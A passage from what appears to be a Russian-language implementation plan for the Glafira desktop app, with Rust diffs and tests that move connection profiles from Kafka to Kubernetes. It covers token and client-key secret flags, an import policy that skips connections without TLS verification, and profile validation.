-fn needs_password(secrets: &dyn SecretStore, p: &ConnectionProfile) -> AppResult<NeedsPassword> {
-    let check = |field: &str| -> AppResult<bool> {
-        if !uses_secret(&p.security, field) {
-            return Ok(false);
-        }
+/// Флаг поднимается, только если секрет сохранён и профиль его действительно использует:
+/// устаревшие записи keychain не требуют ввода у получателя.
+fn needs_secret(secrets: &dyn SecretStore, p: &ConnectionProfile) -> AppResult<NeedsSecret> {
+    let stored = |field: &str| -> AppResult<bool> {
         Ok(secrets
             .get(&secret_key(&p.id, field))?
             .is_some_and(|v| !v.is_empty()))
     };
-    Ok(NeedsPassword {
-        sasl: check(SASL_PASSWORD)?,
-        truststore: check(SSL_TRUSTSTORE_PASSWORD)?,
-        keystore: check(SSL_KEYSTORE_PASSWORD)?,
-        key: check(SSL_KEY_PASSWORD)?,
+    Ok(NeedsSecret {
+        token: p.auth.uses_token() && stored(TOKEN)?,
+        client_key: matches!(p.auth, AuthConfig::ClientCert { .. }) && stored(CLIENT_KEY)?,
     })
 }
 
 /// Собирает файл экспорта: всё дерево или поддерево `root` (сама папка становится корнем).
-/// Секреты (keychain и секретные `extraProperties`) не попадают в файл; неизвестные локальные
-/// поля (`extra`) не выносятся.
+/// Секреты keychain не попадают в файл; неизвестные локальные поля (`extra`) не выносятся.
 pub fn build_export(
     store: &ConnectionStore,
     secrets: &dyn SecretStore,
@@ -134,16 +123,10 @@ pub fn build_export(
         .filter(|p| in_scope(p.folder_id.as_deref()))
         .map(|mut profile| {
             profile.extra.clear();
-            // Доступ LLM — локальное решение получателя (спец. G1 §4): Off в файл не пишется.
-            profile.llm_access = LlmAccess::Off;
-            // Профили с диска не валидируются: секреты в дополнительных свойствах не выносим.
-            profile
-                .extra_properties
-                .retain(|k, _| !is_secret_property(k));
-            let needs_password = needs_password(secrets, &profile)?;
+            let needs_secret = needs_secret(secrets, &profile)?;
             Ok(ExportedConnection {
                 profile,
-                needs_password,
+                needs_secret,
             })
         })
         .collect::<AppResult<Vec<_>>>()?;
@@ -166,11 +149,11 @@ pub struct Skipped {
     pub reason: LocalizedText,
 }
 
-/// Прочитанный файл обмена: папки, подключения (с флагами паролей) и пропущенные подключения.
+/// Прочитанный файл обмена: папки, подключения (с флагами секретов) и пропущенные подключения.
 #[derive(Debug, Clone, Default)]
 pub struct ParsedExchange {
     pub folders: Vec<ConnectionFolder>,
-    pub connections: Vec<(ConnectionProfile, NeedsPassword)>,
+    pub connections: Vec<(ConnectionProfile, NeedsSecret)>,
     pub skipped: Vec<Skipped>,
 }
 
@@ -280,7 +263,7 @@ pub fn parse_exchange(bytes: &[u8]) -> AppResult<ParsedExchange> {
             });
             continue;
         }
-        connections.push((c.profile, c.needs_password));
+        connections.push((c.profile, c.needs_secret));
     }
     Ok(ParsedExchange {
         folders,
@@ -293,6 +276,8 @@ pub struct ImportOptions<'a> {
     /// Папка, под которую попадают корневые элементы файла; `None` — корень.
     pub target: Option<&'a str>,
     pub update_existing: bool,
+    /// `false` — политика запрещает подключения без проверки сертификата (спец. §12).
+    pub allow_insecure_tls: bool,
 }
 
 #[derive(Serialize, Debug, Clone, PartialEq)]
@@ -313,7 +298,7 @@ pub struct ImportPreview {
     pub unchanged: Vec<PreviewItem>,
     pub skipped: Vec<Skipped>,
     pub warnings: Vec<LocalizedText>,
-    pub needs_passwords: usize,
+    pub needs_secrets: usize,
 }
 
 #[derive(Debug, Clone)]
@@ -375,51 +360,24 @@ fn parents_first(folders: &[ConnectionFolder]) -> Vec<(&ConnectionFolder, bool)>
     out
 }
 
-fn tls_of(security: &SecurityConfig) -> Option<&crate::storage::connections::TlsConfig> {
-    match security {
-        SecurityConfig::Ssl { tls } | SecurityConfig::SaslSsl { tls, .. } => Some(tls),
-        _ => None,
-    }
-}
-
-/// Хотя бы один указанный файл сертификата отсутствует на этом компьютере.
-fn misses_files(p: &ConnectionProfile, file_exists: &dyn Fn(&str) -> bool) -> bool {
-    let Some(tls) = tls_of(&p.security) else {
-        return false;
-    };
-    let cert = tls.client_cert.as_ref();
-    [
-        tls.ca_location.as_deref(),
-        cert.map(|c| c.certificate_path.as_str()),
-        cert.and_then(|c| c.key_path.as_deref()),
-    ]
-    .into_iter()
-    .flatten()
-    .map(str::trim)
-    .filter(|s| !s.is_empty())
-    .any(|path| !file_exists(path))
-}
-
 /// Настройки подключения без места в дереве и локальных неизвестных полей.
 fn same_settings(a: &ConnectionProfile, b: &ConnectionProfile) -> bool {
     let strip = |p: &ConnectionProfile| ConnectionProfile {
         id: String::new(),
         folder_id: None,
         order: 0,
-        llm_access: LlmAccess::Off,
         extra: Default::default(),
         ..p.clone()
     };
     strip(a) == strip(b)
 }
 
-/// Строит новое состояние хранилища и предпросмотр импорта. Функция чистая: лицензия и
-/// проверка файлов сертификатов приходят снаружи.
+/// Строит новое состояние хранилища и предпросмотр импорта. Функция чистая: разрешение
+/// политики приходит в `opts`.
 pub(crate) fn plan_import(
     data: &StoreData,
     parsed: &ParsedExchange,
     opts: &ImportOptions,
-    file_exists: &dyn Fn(&str) -> bool,
 ) -> AppResult<ImportPlan> {
     let target = opts.target.map(str::to_string);
     if let Some(t) = &target
@@ -474,11 +432,20 @@ pub(crate) fn plan_import(
         added.push((TreeItemKind::Folder, f.id.clone()));
     }
 
-    let mut connections: Vec<&(ConnectionProfile, NeedsPassword)> =
+    let mut connections: Vec<&(ConnectionProfile, NeedsSecret)> =
         parsed.connections.iter().collect();
     connections.sort_by_key(|(p, _)| p.order);
-    let mut missing_files = 0usize;
     for (incoming, needs) in connections {
+        if !opts.allow_insecure_tls && incoming.ca == CaConfig::Insecure {
+            preview.skipped.push(Skipped {
+                name: incoming.name.clone(),
+                reason: ltext!(
+                    "errors.import.insecureForbidden",
+                    "Connections without TLS certificate verification are forbidden by your organization"
+                ),
+            });
+            continue;
+        }
         let mut profile = incoming.clone();
         if let Some(slot) = next.connections.iter_mut().find(|c| c.id == profile.id) {
             if same_settings(slot, incoming) || !opts.update_existing {
@@ -488,9 +455,7 @@ pub(crate) fn plan_import(
             // Место в дереве и неизвестные поля — локальные; пароли получателя не трогаются.
             profile.folder_id = slot.folder_id.clone();
             profile.order = slot.order;
-            profile.llm_access = slot.llm_access;
             profile.extra = std::mem::take(&mut slot.extra);
-            missing_files += usize::from(misses_files(&profile, file_exists));
             updated.push((TreeItemKind::Connection, profile.id.clone()));
             *slot = profile;
             continue;
@@ -525,23 +490,14 @@ pub(crate) fn plan_import(
             .unwrap_or(0);
         profile.folder_id = folder;
         profile.name = name;
-        profile.llm_access = LlmAccess::Off;
         profile.extra = Default::default();
-        missing_files += usize::from(misses_files(&profile, file_exists));
-        if needs.sasl || needs.truststore || needs.keystore || needs.key {
-            preview.needs_passwords += 1;
+        if needs.token || needs.client_key {
+            preview.needs_secrets += 1;
         }
         added.push((TreeItemKind::Connection, profile.id.clone()));
         next.connections.push(profile);
     }
 
-    if missing_files > 0 {
-        preview.warnings.push(ltext!(
-            "warnings.import.missingFiles",
-            "Certificate files of {{count}} connections are not found on this computer — check the paths",
-            count = missing_files
-        ));
-    }
     check_tree(&next)?;
 
     let folders_by_id: HashMap<&str, &ConnectionFolder> =
@@ -578,9 +534,8 @@ pub(crate) fn plan_import(
 mod tests {
     use super::*;
     use crate::secrets::MemoryStore;
-    use crate::storage::connections::{
-        CertFormat, SaslConfig, SaslMechanism, SecurityConfig, TlsConfig, sample_profile,
-    };
+    use crate::storage::connections::sample_profile;
+    use crate::storage::profile::TEST_CERT_PEM;
 
     fn store() -> (tempfile::TempDir, ConnectionStore) {
         let d = tempfile::tempdir().unwrap();
@@ -624,7 +579,7 @@ mod tests {
             "2026-10-17T12:00:00Z",
         )
         .unwrap();
-        assert_eq!(out.format, "glafira-connections");
+        assert_eq!(out.format, "glafira-kubernetes-connections");
         assert_eq!(out.version, 1);
         assert_eq!(out.app_version, "9.9.9");
         assert_eq!(out.exported_at, "2026-10-17T12:00:00Z");
@@ -637,12 +592,12 @@ mod tests {
         );
 
         let v = serde_json::to_value(&out).unwrap();
-        assert_eq!(v["format"], "glafira-connections");
+        assert_eq!(v["format"], "glafira-kubernetes-connections");
         assert_eq!(v["version"], 1);
         assert!(v["exportedAt"].is_string());
         assert!(v["appVersion"].is_string());
-        assert!(v["connections"][0]["needsPassword"]["sasl"].is_boolean());
-        assert!(v["connections"][0]["bootstrapServers"].is_string());
+        assert!(v["connections"][0]["needsSecret"]["token"].is_boolean());
+        assert!(v["connections"][0]["apiUrl"].is_string());
     }
 
     #[test]
@@ -671,44 +626,51 @@ mod tests {
     #[test]
     fn secrets_are_never_exported() {
         let (_d, s) = store();
-        let mut p = sample_profile("x");
-        p.security = SecurityConfig::SaslPlaintext {
-            sasl: SaslConfig {
-                mechanism: SaslMechanism::Plain,
-                username: "user".into(),
-            },
+        s.upsert(sample_profile("tok")).unwrap();
+        let mut cert = sample_profile("cert");
+        cert.auth = AuthConfig::ClientCert {
+            certificate_pem: TEST_CERT_PEM.into(),
         };
-        s.upsert(p).unwrap();
-        s.upsert(sample_profile("y")).unwrap();
+        s.upsert(cert).unwrap();
+        s.upsert(sample_profile("empty")).unwrap();
         let secrets = MemoryStore::default();
         secrets
-            .set(&secret_key("x", SASL_PASSWORD), "s3cr3t")
+            .set(&secret_key("tok", TOKEN), "sha256~s3cr3t")
             .unwrap();
-        // У PLAINTEXT-подключения устаревший пароль в keychain не делает флаг истинным.
         secrets
-            .set(&secret_key("y", SASL_PASSWORD), "s3cr3t")
+            .set(&secret_key("cert", CLIENT_KEY), "KEY-s3cr3t")
+            .unwrap();
+        // Устаревший токен у подключения с сертификатом флаг не поднимает.
+        secrets
+            .set(&secret_key("cert", TOKEN), "sha256~old")
             .unwrap();
         let out = build_export(&s, &secrets, None, "1", "now").unwrap();
         let json = serde_json::to_string(&out).unwrap();
-        assert!(!json.contains("s3cr3t"));
-        let x = out
-            .connections
-            .iter()
-            .find(|c| c.profile.id == "x")
-            .unwrap();
+        assert!(!json.contains("s3cr3t") && !json.contains("sha256~old"));
+        assert_eq!(out.format, "glafira-kubernetes-connections");
+        let flags = |id: &str| {
+            out.connections
+                .iter()
+                .find(|c| c.profile.id == id)
+                .unwrap()
+                .needs_secret
+                .clone()
+        };
         assert_eq!(
-            x.needs_password,
-            NeedsPassword {
-                sasl: true,
-                ..Default::default()
+            flags("tok"),
+            NeedsSecret {
+                token: true,
+                client_key: false
             }
         );
-        let y = out
-            .connections
-            .iter()
-            .find(|c| c.profile.id == "y")
-            .unwrap();
-        assert_eq!(y.needs_password, NeedsPassword::default());
+        assert_eq!(
+            flags("cert"),
+            NeedsSecret {
+                token: false,
+                client_key: true
+            }
+        );
+        assert_eq!(flags("empty"), NeedsSecret::default());
     }
 
     #[test]
@@ -727,65 +689,6 @@ mod tests {
         assert!(!serde_json::to_string(&out).unwrap().contains("futureField"));
     }
 
-    #[test]
-    fn secret_extra_properties_are_not_exported() {
-        let (_d, s) = store();
-        s.upsert(sample_profile("a")).unwrap();
-        // Профили с диска не валидируются: старый или правленый вручную файл может содержать секреты.
-        s.update(|data| {
-            let props = &mut data.connections[0].extra_properties;
-            props.insert(
-                "sasl.jaas.config".into(),
-                "org.apache.kafka.common.security.plain.PlainLoginModule required username=\"u\" password=\"s3cr3t\";".into(),
-            );
-            props.insert("ssl.key.password".into(), "s3cr3t".into());
-            props.insert("linger.ms".into(), "5".into());
-            Ok(())
-        })
-        .unwrap();
-        let out = build_export(&s, &MemoryStore::default(), None, "1", "now").unwrap();
-        let json = serde_json::to_string(&out).unwrap();
-        assert!(!json.contains("s3cr3t"));
-        assert!(!json.contains("sasl.jaas.config"));
-        assert!(!json.contains("ssl.key.password"));
-        assert_eq!(
-            out.connections[0].profile.extra_properties.get("linger.ms"),
-            Some(&"5".to_string())
-        );
-    }
-
-    #[test]
-    fn leftover_truststore_password_of_pem_ca_is_not_flagged() {
-        let (_d, s) = store();
-        let mut p = sample_profile("t");
-        p.security = SecurityConfig::Ssl {
-            tls: TlsConfig {
-                ca_location: Some(
-                    if cfg!(windows) {
-                        "C:\\ca.pem"
-                    } else {
-                        "/ca.pem"
-                    }
-                    .into(),
-                ),
-                ca_format: CertFormat::Pem,
-                verify_hostname: true,
-                client_cert: None,
-            },
-        };
-        s.upsert(p).unwrap();
-        let secrets = MemoryStore::default();
-        for f in [
-            SSL_TRUSTSTORE_PASSWORD,
-            SSL_KEYSTORE_PASSWORD,
-            SSL_KEY_PASSWORD,
-        ] {
-            secrets.set(&secret_key("t", f), "old").unwrap();
-        }
-        let out = build_export(&s, &secrets, None, "1", "now").unwrap();
-        assert_eq!(out.connections[0].needs_password, NeedsPassword::default());
-    }
-
     #[test]
     fn unknown_root_is_an_error() {
         let (_d, s) = store();
@@ -803,7 +706,7 @@ mod tests {
         p.name = name.into();
         p.folder_id = folder.map(String::from);
         let mut v = serde_json::to_value(&p).unwrap();
-        v["needsPassword"] = serde_json::json!({"sasl": false, "truststore": false, "keystore": false, "key": false});
+        v["needsSecret"] = serde_json::json!({"token": false, "clientKey": false});
         v
     }
 
@@ -813,7 +716,7 @@ mod tests {
 
     fn file(folders: Vec<serde_json::Value>, conns: Vec<serde_json::Value>) -> Vec<u8> {
         serde_json::to_vec(&serde_json::json!({
-            "format": "glafira-connections",
+            "format": "glafira-kubernetes-connections",
             "version": 1,
             "exportedAt": "now",
             "appVersion": "1",
@@ -837,16 +740,13 @@ mod tests {
         ImportOptions {
             target,
             update_existing: true,
+            allow_insecure_tls: true,
         }
     }
 
-    fn all_exist(_: &str) -> bool {
-        true
-    }
-
     fn plan(data: &StoreData, bytes: &[u8], o: &ImportOptions) -> ImportPlan {
         let parsed = parse_exchange(bytes).unwrap();
-        plan_import(data, &parsed, o, &all_exist).unwrap()
+        plan_import(data, &parsed, o).unwrap()
     }
 
     fn conn<'a>(data: &'a StoreData, id: &str) -> &'a ConnectionProfile {
@@ -900,14 +800,9 @@ mod tests {
     #[test]
     fn unknown_target_is_an_error() {
         let parsed = parse_exchange(&file(vec![], vec![])).unwrap();
-        let err = plan_import(
-            &StoreData::default(),
-            &parsed,
-            &opts(Some("nope")),
-            &all_exist,
-        )
-        .err()
-        .unwrap();
+        let err = plan_import(&StoreData::default(), &parsed, &opts(Some("nope")))
+            .err()
+            .unwrap();
         assert_eq!(err.key, "errors.folders.notFound");
     }
 
@@ -923,12 +818,12 @@ mod tests {
             ..Default::default()
         };
         let mut changed = conn_json("a", "conn-a", None);
-        changed["bootstrapServers"] = "other:9092".into();
+        changed["apiUrl"] = "https://api.other:6443".into();
         let bytes = file(vec![], vec![changed]);
 
         let p = plan(&data, &bytes, &opts(None));
         let a = conn(&p.next, "a");
-        assert_eq!(a.bootstrap_servers, "other:9092");
+        assert_eq!(a.api_url, "https://api.other:6443");
         assert_eq!(a.folder_id.as_deref(), Some("f"));
         assert_eq!(a.order, 7);
         assert_eq!(a.extra.get("pinned"), Some(&serde_json::json!(true)));
@@ -954,50 +849,6 @@ mod tests {
         assert_eq!(conn(&p.next, "a"), &local);
     }
 
-    #[test]
-    fn llm_access_is_never_exported_or_imported() {
-        let (_d, s) = store();
-        let mut open = sample_profile("a");
-        open.llm_access = LlmAccess::Metadata;
-        s.upsert(open).unwrap();
-        let out = build_export(&s, &MemoryStore::default(), None, "1", "now").unwrap();
-        let json = serde_json::to_value(&out).unwrap();
-        assert!(json["connections"][0].get("llmAccess").is_none(), "{json}");
-
-        let mut local = sample_profile("a");
-        local.llm_access = LlmAccess::Metadata;
-        let data = StoreData {
-            connections: vec![local],
-            ..Default::default()
-        };
-        let mut incoming_a = conn_json("a", "conn-a", None);
-        incoming_a["llmAccess"] = "off".into();
-        incoming_a["bootstrapServers"] = "other:9092".into();
-        let mut incoming_b = conn_json("b", "conn-b", None);
-        incoming_b["llmAccess"] = "metadata".into();
-        let p = plan(
-            &data,
-            &file(vec![], vec![incoming_a, incoming_b]),
-            &opts(None),
-        );
-        assert_eq!(
-            conn(&p.next, "a").llm_access,
-            LlmAccess::Metadata,
-            "своё решение сохраняется"
-        );
-        assert_eq!(
-            conn(&p.next, "b").llm_access,
-            LlmAccess::Off,
-            "файл не открывает доступ"
-        );
-
-        // Отличие только в llmAccess — «без изменений».
-        let mut same = conn_json("a", "conn-a", None);
-        same["llmAccess"] = "off".into();
-        let p = plan(&data, &file(vec![], vec![same]), &opts(None));
-        assert_eq!(preview_ids(&p.preview.unchanged), ["a"]);
-    }
-
     #[test]
     fn matched_folder_is_not_renamed_or_moved_and_receives_new_connections() {
         let data = StoreData {
@@ -1096,84 +947,42 @@ mod tests {
     }
 
     #[test]
-    fn secrets_in_extra_properties_are_skipped() {
-        let mut leaky = conn_json("s", "Leaky", None);
-        leaky["extraProperties"] = serde_json::json!({"sasl.password": "x"});
-        let bytes = file(vec![], vec![leaky, conn_json("ok", "OK", None)]);
+    fn insecure_connections_are_skipped_when_policy_forbids() {
+        let mut insecure = conn_json("i", "Insecure", None);
+        insecure["ca"] = serde_json::json!({"mode": "insecure"});
+        let bytes = file(vec![], vec![insecure, conn_json("ok", "OK", None)]);
         let parsed = parse_exchange(&bytes).unwrap();
-        assert_eq!(parsed.skipped.len(), 1);
-        assert_eq!(parsed.skipped[0].name, "Leaky");
-        assert_eq!(
-            parsed.skipped[0].reason.key,
-            "errors.connections.secretInExtraProperties"
-        );
-        let p = plan_import(&StoreData::default(), &parsed, &opts(None), &all_exist).unwrap();
-        assert!(p.next.connections.iter().all(|c| c.id != "s"));
-        assert!(
-            !serde_json::to_string(&p.next.connections)
-                .unwrap()
-                .contains("sasl.password")
-        );
-    }
-
-    #[test]
-    fn missing_certificate_files_are_warned_about() {
-        let abs = |f: &str| {
-            if cfg!(windows) {
-                format!("C:\\certs\\{f}")
-            } else {
-                format!("/certs/{f}")
-            }
+        let p = plan_import(&StoreData::default(), &parsed, &opts(None)).unwrap();
+        assert_eq!(preview_ids(&p.preview.added), ["i", "ok"]);
+        let forbid = ImportOptions {
+            allow_insecure_tls: false,
+            ..opts(None)
         };
-        let mut tls = conn_json("t", "T", None);
-        tls["security"] = serde_json::json!({
-            "protocol": "SSL",
-            "tls": {"caLocation": abs("ca.pem"), "caFormat": "pem", "verifyHostname": true,
-                    "clientCert": {"format": "pem", "certificatePath": abs("c.pem"), "keyPath": abs("k.pem")}}
-        });
-        let mut tls2 = tls.clone();
-        tls2["id"] = "t2".into();
-        let bytes = file(vec![], vec![tls, tls2, conn_json("plain", "Plain", None)]);
-        let parsed = parse_exchange(&bytes).unwrap();
-        let missing = |p: &str| !p.ends_with("k.pem");
-        let p = plan_import(&StoreData::default(), &parsed, &opts(None), &missing).unwrap();
-        assert_eq!(p.preview.warnings.len(), 1);
-        assert_eq!(p.preview.warnings[0].key, "warnings.import.missingFiles");
-        assert_eq!(p.preview.warnings[0].params["count"], "2");
-        let p = plan_import(&StoreData::default(), &parsed, &opts(None), &all_exist).unwrap();
-        assert!(p.preview.warnings.is_empty());
-
-        // Обновлённое подключение тоже проверяется.
-        let data = StoreData {
-            connections: vec![sample_profile("t")],
-            ..Default::default()
-        };
-        let only_t = file(
-            vec![],
-            vec![serde_json::to_value(&parsed.connections[0].0).unwrap()],
+        let p = plan_import(&StoreData::default(), &parsed, &forbid).unwrap();
+        assert_eq!(preview_ids(&p.preview.added), ["ok"]);
+        assert_eq!(p.preview.skipped.len(), 1);
+        assert_eq!(p.preview.skipped[0].name, "Insecure");
+        assert_eq!(
+            p.preview.skipped[0].reason.key,
+            "errors.import.insecureForbidden"
         );
-        let parsed = parse_exchange(&only_t).unwrap();
-        let p = plan_import(&data, &parsed, &opts(None), &missing).unwrap();
-        assert_eq!(preview_ids(&p.preview.updated), ["t"]);
-        assert_eq!(p.preview.warnings.len(), 1);
-        assert_eq!(p.preview.warnings[0].key, "warnings.import.missingFiles");
-        assert_eq!(p.preview.warnings[0].params["count"], "1");
+        assert!(p.next.connections.iter().all(|c| c.id != "i"));
     }
 
     #[test]
-    fn needs_passwords_counts_new_connections_only() {
+    fn needs_secrets_counts_new_connections_only() {
         let mut a = conn_json("a", "A", None);
-        a["needsPassword"]["sasl"] = true.into();
+        a["needsSecret"]["token"] = true.into();
         let mut b = conn_json("b", "B", None);
-        b["needsPassword"]["key"] = true.into();
-        b["bootstrapServers"] = "changed:1".into();
+        b["needsSecret"]["clientKey"] = true.into();
+        b["apiUrl"] = "https://api.changed:6443".into();
         let data = StoreData {
             connections: vec![sample_profile("b")],
             ..Default::default()
         };
         let p = plan(&data, &file(vec![], vec![a, b]), &opts(None));
         assert_eq!(preview_ids(&p.preview.updated), ["b"]);
-        assert_eq!(p.preview.needs_passwords, 1);
+        assert_eq!(p.preview.needs_secrets, 1);
     }
 
     #[test]
@@ -1181,13 +990,9 @@ mod tests {
         let mut ok = conn_json("ok", "OK", None);
         ok["futureField"] = serde_json::json!({"x": 1});
         let mut oauth = conn_json("oauth", "OAuth", None);
-        oauth["security"] = serde_json::json!({
-            "protocol": "SASL_SSL",
-            "tls": {"verifyHostname": true},
-            "sasl": {"mechanism": "OAUTHBEARER", "username": "u"}
-        });
+        oauth["auth"] = serde_json::json!({"method": "oidcExec", "command": "oc"});
         let mut invalid = conn_json("bad", "Bad", None);
-        invalid["bootstrapServers"] = "nope".into();
+        invalid["apiUrl"] = "http://api.c:6443".into();
         let mut v: serde_json::Value =
             serde_json::from_slice(&file(vec![], vec![ok, oauth, invalid])).unwrap();
         v["somethingNew"] = serde_json::json!([1, 2]);
@@ -1204,10 +1009,10 @@ mod tests {
         assert_eq!(parsed.skipped[1].name, "Bad");
         assert_eq!(
             parsed.skipped[1].reason.key,
-            "errors.connections.addressFormat"
+            "errors.connections.httpsRequired"
         );
 
-        let p = plan_import(&StoreData::default(), &parsed, &opts(None), &all_exist).unwrap();
+        let p = plan_import(&StoreData::default(), &parsed, &opts(None)).unwrap();
         assert_eq!(preview_ids(&p.preview.added), ["ok"]);
         assert_eq!(p.preview.skipped.len(), 2);
 
@@ -1233,25 +1038,19 @@ mod tests {
         let (_d, s) = store();
         let (ift, k1, psi) = tree(&s);
         let mut x = sample_profile("x");
-        x.security = SecurityConfig::SaslPlaintext {
-            sasl: SaslConfig {
-                mechanism: SaslMechanism::Plain,
-                username: "user".into(),
-            },
-        };
         x.folder_id = Some(psi.clone());
         s.upsert(x).unwrap();
         let secrets = MemoryStore::default();
         secrets
-            .set(&secret_key("x", SASL_PASSWORD), "s3cr3t")
+            .set(&secret_key("x", TOKEN), "sha256~s3cr3t")
             .unwrap();
         let out = build_export(&s, &secrets, None, "1", "now").unwrap();
         let bytes = serde_json::to_vec(&out).unwrap();
 
         let parsed = parse_exchange(&bytes).unwrap();
         assert!(parsed.skipped.is_empty());
-        let p = plan_import(&StoreData::default(), &parsed, &opts(None), &all_exist).unwrap();
-        assert_eq!(p.preview.needs_passwords, 1);
+        let p = plan_import(&StoreData::default(), &parsed, &opts(None)).unwrap();
+        assert_eq!(p.preview.needs_secrets, 1);
         let sort_f = |mut v: Vec<ConnectionFolder>| {
             v.sort_by(|a, b| a.id.cmp(&b.id));
             v
````

Применить: `python3 /tmp/o1a-blocks.py step 4.1`.

- [ ] **Step 2: Тесты.**

<!-- block: file t04-src-tauri-src-storage-profile-rs-tests step=4.2 path=src-tauri/src/storage/profile.rs part=tests -->
````rust
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn json_shape_matches_frontend_contract() {
        let mut p = sample_profile("x");
        p.auth = AuthConfig::ClientCert {
            certificate_pem: "PEM".into(),
        };
        p.ca = CaConfig::Pem { pem: "CA".into() };
        p.proxy = ProxyConfig::Url {
            url: "http://proxy:3128".into(),
        };
        let v = serde_json::to_value(&p).unwrap();
        assert_eq!(v["apiUrl"], "https://api.dev.example.com:6443");
        assert_eq!(
            v["auth"],
            serde_json::json!({"method": "clientCert", "certificatePem": "PEM"})
        );
        assert_eq!(v["ca"], serde_json::json!({"mode": "pem", "pem": "CA"}));
        assert_eq!(
            v["proxy"],
            serde_json::json!({"mode": "url", "url": "http://proxy:3128"})
        );
        assert_eq!(v["readOnly"], false);
        assert_eq!(v["requestTimeoutMs"], 30_000);
        assert_eq!(v["connectTimeoutMs"], 10_000);
        let back: ConnectionProfile = serde_json::from_value(v).unwrap();
        assert_eq!(back, p);
    }

    #[test]
    fn minimal_json_gets_defaults() {
        let p: ConnectionProfile = serde_json::from_value(serde_json::json!({
            "id": "a", "name": "A", "color": "#fff", "environment": "dev", "readOnly": false,
            "apiUrl": "https://api.c:6443", "auth": {"method": "browser"}
        }))
        .unwrap();
        assert_eq!(p.ca, CaConfig::System);
        assert_eq!(p.proxy, ProxyConfig::System);
        assert_eq!(p.auth, AuthConfig::Browser);
        assert!(p.auth.uses_token());
        assert_eq!(
            (p.request_timeout_ms, p.connect_timeout_ms),
            (30_000, 10_000)
        );
        assert!(p.favorite_namespaces.is_empty());
    }

    #[test]
    fn normalization_trims_and_dedups() {
        let mut p = sample_profile("a");
        p.api_url = " https://api.c:6443/ ".into();
        p.tls_server_name = Some("  ".into());
        p.favorite_namespaces = vec![" team-a ".into(), "".into(), "team-a".into(), "b".into()];
        normalize_profile(&mut p);
        assert_eq!(p.api_url, "https://api.c:6443");
        assert_eq!(p.tls_server_name, None);
        p.api_url = "https://rancher.corp/k8s/clusters/c-x1/ ".into();
        normalize_profile(&mut p);
        assert_eq!(
            p.api_url, "https://rancher.corp/k8s/clusters/c-x1",
            "путь сохраняется"
        );
        assert_eq!(p.favorite_namespaces, vec!["team-a", "b"]);
    }

    #[test]
    fn namespace_names() {
        for ok in ["a", "team-a", "a1", "0abc", &"a".repeat(63)] {
            assert!(is_valid_namespace(ok), "{ok}");
        }
        for bad in ["", "-a", "a-", "Team", "a_b", "a.b", &"a".repeat(64)] {
            assert!(!is_valid_namespace(bad), "{bad}");
        }
    }

    #[test]
    fn pem_certificates_need_a_certificate_block() {
        assert_eq!(pem_certificates(TEST_CERT_PEM).unwrap().len(), 1);
        let two = format!("{TEST_CERT_PEM}\n{TEST_CERT_PEM}");
        assert_eq!(pem_certificates(&two).unwrap().len(), 2);
        assert!(pem_certificates("not pem").is_err());
        assert!(
            pem_certificates("-----BEGIN PRIVATE KEY-----\nAAAA\n-----END PRIVATE KEY-----\n")
                .is_err()
        );
    }

    type Change = Box<dyn Fn(&mut ConnectionProfile)>;

    #[test]
    fn validation_accepts_sample_and_rejects_bad_fields() {
        assert!(validate_profile(&sample_profile("a")).is_ok());
        let cases: Vec<(&str, Change)> = vec![
            ("errors.connections.noId", Box::new(|p| p.id = " ".into())),
            (
                "errors.connections.emptyName",
                Box::new(|p| p.name = "".into()),
            ),
            (
                "errors.connections.badApiUrl",
                Box::new(|p| p.api_url = "https://".into()),
            ),
            (
                "errors.connections.badApiUrl",
                Box::new(|p| p.api_url = "https://api.c:6443/k8s?cluster=x".into()),
            ),
            (
                "errors.connections.httpsRequired",
                Box::new(|p| p.api_url = "http://api.c:6443".into()),
            ),
            (
                "errors.connections.certificatePemInvalid",
                Box::new(|p| {
                    p.auth = AuthConfig::ClientCert {
                        certificate_pem: "x".into(),
                    }
                }),
            ),
            (
                "errors.connections.caPemInvalid",
                Box::new(|p| p.ca = CaConfig::Pem { pem: "x".into() }),
            ),
            (
                "errors.connections.badProxyUrl",
                Box::new(|p| {
                    p.proxy = ProxyConfig::Url {
                        url: "socks://x".into(),
                    }
                }),
            ),
            (
                "errors.connections.badNamespace",
                Box::new(|p| p.manual_namespaces = vec!["Bad".into()]),
            ),
            (
                "errors.connections.timeoutTooSmall",
                Box::new(|p| p.connect_timeout_ms = 10),
            ),
        ];
        for (key, change) in cases {
            let mut p = sample_profile("a");
            change(&mut p);
            let e = validate_profile(&p).unwrap_err();
            assert_eq!((e.code, e.key.as_str()), (ErrorCode::InvalidInput, key));
        }
        let mut p = sample_profile("a");
        p.auth = AuthConfig::ClientCert {
            certificate_pem: TEST_CERT_PEM.into(),
        };
        p.ca = CaConfig::Pem {
            pem: TEST_CERT_PEM.into(),
        };
        p.proxy = ProxyConfig::Url {
            url: "http://proxy.corp:3128".into(),
        };
        assert!(validate_profile(&p).is_ok());
        p.api_url = "https://rancher.corp/k8s/clusters/c-x1".into();
        assert!(
            validate_profile(&p).is_ok(),
            "адрес с путём (прокси Rancher)"
        );
    }

    #[test]
    fn profile_json_never_contains_secrets() {
        let v = serde_json::to_string(&sample_profile("a"))
            .unwrap()
            .to_lowercase();
        for word in ["\"token\":", "password", "clientkey"] {
            assert!(!v.contains(word), "{word}");
        }
    }
}
````

Применить: `python3 /tmp/o1a-blocks.py step 4.2`.

- [ ] **Step 3: Реализация.**

<!-- block: file t04-src-tauri-src-storage-profile-rs-impl step=4.3 path=src-tauri/src/storage/profile.rs part=impl -->
````rust
//! Профиль подключения к кластеру Kubernetes (спец. §5.1). Секреты в профиле не хранятся: токен и ключ
//! клиентского сертификата лежат в keychain (`secrets::TOKEN`, `secrets::CLIENT_KEY`).

use serde::{Deserialize, Serialize};

use crate::error::{AppError, AppResult, ErrorCode};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Environment {
    Local,
    Dev,
    Test,
    Stage,
    Prod,
}

/// Как Glafira входит в кластер (спец. §5.2).
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(tag = "method", rename_all = "camelCase")]
pub enum AuthConfig {
    /// Токен вставлен вручную (`oc whoami -t`, токен ServiceAccount).
    Token,
    /// Вход через браузер в OAuth OpenShift; полученный токен хранится так же, как у `Token`.
    Browser,
    /// Клиентский сертификат: сертификат (PEM) — в профиле, ключ — в keychain.
    #[serde(rename_all = "camelCase")]
    ClientCert { certificate_pem: String },
}

impl AuthConfig {
